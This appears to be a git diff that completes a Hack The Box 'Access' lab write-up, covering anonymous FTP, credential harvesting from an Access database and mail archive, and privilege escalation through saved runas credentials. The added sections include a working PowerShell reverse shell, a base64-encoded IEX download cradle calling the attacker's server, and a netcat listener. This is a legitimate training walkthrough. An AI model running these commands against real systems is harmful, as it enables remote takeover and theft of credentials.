@@ -13,10 +13,10 @@
 
 #### Skills Learned
 
-- ****
-- ****
-- ****
-- 
+- **Anonymous FTP Login**
+- **Access Databases / Outlook Personal Archives Enumeration**
+- **Credentials Harvesting**
+- **Saved Credentials Privilege Escalation**
 
 #### Tools Used
 
@@ -28,7 +28,9 @@ Linux:
 - `7z`
 - `readpst`
 - `telnet`
-- ``
+Windows:
+- `cmdkey.exe`
+- `runas.exe`
 
 #### Machine Writeup
 
@@ -91,7 +93,7 @@ http://access.htb [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/7.5],
 
 ![Firefox - Access Homepage](./assets/screenshots/hackthebox_access_01.png)
 
-****
+**Anonymous FTP Login**
 
 ```
 ┌──(nabla㉿kali)-[~]
@@ -128,7 +130,7 @@ local: backup.mdb remote: Backups\backup.mdb
 226 Transfer complete.
 ```
 
-****
+**Access Databases / Outlook Personal Archives Enumeration**
 
 ```
 ┌──(nabla㉿kali)-[~]
@@ -233,6 +235,8 @@ total 16
 -rw-r--r-- 1 nvbla nvbla 9728 Jul  1 06:24 2.msg
 ```
 
+**Credentials Harvesting**
+
 ```
 ┌──(nabla㉿kali)-[~]
 └─$ cat Access\ Control/2.eml
@@ -290,66 +294,112 @@ C:\Users\security> type C:\\Users\\security\\Desktop\\user.txt
 831d8*************************** 🚩
 ```
 
-```
-┌──(nabla㉿kali)-[~]
-└─$ 
-
+**Saved Credentials Privilege Escalation**
 
 ```
+C:\Users\security> dir C://Users//Public//Desktop
 
-```
-┌──(nabla㉿kali)-[~]
-└─$ 
+    Directory: C:\Users\Public\Desktop
 
-
+Mode                LastWriteTime     Length Name                              
+----                -------------     ------ ----                              
+-a---         8/22/2018  10:18 PM       1870 ZKAccess3.5 Security System.lnk  
 ```
 
 ```
-┌──(nabla㉿kali)-[~]
-└─$ 
+C:\Users\security> type "C://Users//Public//Desktop//ZKAccess3.5 Security System.lnk"
 
-
+L?F?@ ??7???7???#?P/P?O? ?:i?+00?/C:\R1M?:Windows???:?�M?:*wWindowsV1MV?System32???:?�MV?*?System32X2P?:?
+                                                                                                          runas.exe???:1??:1?*Yrunas.exeL-K??E?C:\Windows\System32\runas.exe#..\..\..\Windows\System32\runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"'C:\ZKTeco\ZKAccess3.5\img\AccessNET.ico?%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico?%?
+                                                                                                                                               ?wN?�?]N?D.??Q???`?Xaccess?_???8{E?3
+                            O?j)?H???
+                                     )??[?_???8{E?3
+                                                   O?j)?H???
+                                                            )??[?	??1SPS??XF?L8C???&?m?e*S-1-5-21-953262931-566350628-63446256-500
 ```
 
 ```
-┌──(nabla㉿kali)-[~]
-└─$ 
+C:\Users\security> cmdkey /list
 
+Currently stored credentials:
 
-```
-
-```
-┌──(nabla㉿kali)-[~]
-└─$ 
-
-
-```
-
-```
-┌──(nabla㉿kali)-[~]
-└─$ 
-
-
+    Target: Domain:interactive=ACCESS\Administrator
+    Type: Domain Password
+    User: ACCESS\Administrator
 ```
 
 ```
 ┌──(nabla㉿kali)-[~]
-└─$ 
+└─$ locate nishang
 
+[SNIP]
 
+/usr/share/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1
 ```
 
 ```
 ┌──(nabla㉿kali)-[~]
-└─$ 
+└─$ cat /usr/share/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1
 
+#A simple and small reverse shell. Options and help removed to save space. 
+#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
+#$client = New-Object System.Net.Sockets.TCPClient('192.168.254.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 
+#$sm=(New-Object Net.Sockets.TCPClient('192.168.254.1',55555)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
 ```
 
 ```
-root@inject:/opt/automation/tasks# cat /root/root.txt
+┌──(nabla㉿kali)-[~]
+└─$ vim revsh.ps1
 
-adb83*************************** 🚩
+$client = New-Object System.Net.Sockets.TCPClient('10.10.14.144',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+
+```
+┌──(nabla㉿kali)-[~]
+└─$ python3 -m http.server 8000
+
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+
+```
+┌──(nabla㉿kali)-[~]
+└─$ nc -lvnp 1337
+
+listening on [any] 1337 ...
+
+[CONTINUE]
+```
+
+```
+┌──(nabla㉿kali)-[~]
+└─$ echo -n "IEX(New-Object Net.Webclient).downloadstring('http://10.10.14.144:8000/revsh.ps1')" | iconv --to-code UTF-16LE | base64 -w 0
+
+SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADEANAA0ADoAOAAwADAAMAAvAHIAZQB2AHMAaAAuAHAAcwAxACcAKQA=
+```
+
+```
+C:\Users\security> runas /user:access\Administrator /savecred "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADEANAA0ADoAOAAwADAAMAAvAHIAZQB2AHMAaAAuAHAAcwAxACcAKQA="
+```
+
+```
+[CONTINUE]
+
+connect to [10.10.14.144] from (UNKNOWN) [10.129.36.36] 49161
+
+PS C:\Windows\system32>
+```
+
+```
+PS C:\Windows\system32> whoami
+
+access\administrator
+```
+
+```
+PS C:\Windows\system32> type C://Users//Administrator//Desktop//root.txt
+
+35773*************************** 🚩
 ```
 
 <img src="https://hackmyvm.eu/img/correctflag.png" alt="Machine Hacked!" width="150"/>
